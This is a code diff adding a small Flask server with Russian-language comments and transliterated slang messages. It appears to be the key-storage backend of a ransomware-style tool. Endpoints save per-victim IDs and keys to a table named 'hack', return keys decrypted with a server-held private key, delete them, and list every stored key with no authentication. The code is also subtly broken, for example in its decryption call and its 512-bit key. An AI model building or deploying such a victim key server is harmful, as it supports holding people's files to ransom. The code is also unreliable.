@@ -1,0 +1,75 @@
+from flask import Flask
+from flask import request
+import sqlite3
+from http import HTTPStatus
+from flask import render_template
+import rsa
+
+app = Flask(__name__)
+PublicKey, PrivateKey = rsa.newkeys(512)  # временно
+
+db = sqlite3.connect('HackAdemicBase.db', check_same_thread=False)
+
+db.cursor().execute('''CREATE table if not exists hack(
+                        ID integer primary key AUTOINCREMENT,
+                        UniqID text,
+                        Key string(32)
+                        )
+                    ''')
+# db.cursor().execute("INSERT OR IGNORE INTO hack VALUES(145454, '123', '4adc')")
+db.commit()
+
+
+@app.post('/saveKey')
+def save_key():
+    cur = db.cursor()
+    try:
+        cur.execute("INSERT INTO hack (UniqID, Key) VALUES (?,?) ", [request.form['UniqID'], request.form['Key']])
+    except KeyError:
+        print('S4TURN sent empty message')
+        return 'Plaki Plaki', HTTPStatus.BAD_REQUEST
+    db.commit()
+    return 'Normaldaki', HTTPStatus.OK
+
+
+@app.get('/ReturnToSender')
+def get_key():
+    cur = db.cursor()
+    try:
+        encrypt_result = cur.execute("SELECT Key FROM hack WHERE UniqID = ? ", [request.form['UniqID']]).fetchone()
+    except KeyError:
+        print('Prazyan4ik ne polychit klyuch')
+        return 'Sho delat', HTTPStatus.BAD_REQUEST
+    else:
+        if encrypt_result:
+            print('Prazyan4iky povezlo')
+            decrypt_result = str(rsa.decrypt(bytes(encrypt_result), PrivateKey))
+            return decrypt_result, HTTPStatus.OK
+        else:
+            print('Takogo prazyan4ika ne sushestvyet')
+            return '', HTTPStatus.NOT_FOUND
+
+
+@app.delete('/DeleteKey')
+def delete_key():
+    cur = db.cursor()
+    try:
+        cur.execute("DELETE FROM hack WHERE UniqID = ? ", [request.form['UniqID']])
+        db.commit()
+    except KeyError:
+        print('che ti nesesh?')
+        return 'Prover Id', HTTPStatus.BAD_REQUEST
+    else:
+        print('Vsyo chisto')
+        return 'Ok', HTTPStatus.OK
+
+
+@app.route('/gg')
+def xz():
+    cur = db.cursor()
+    vision = cur.execute('SELECT * FROM hack ')
+    return render_template('gg.html', items=vision)
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
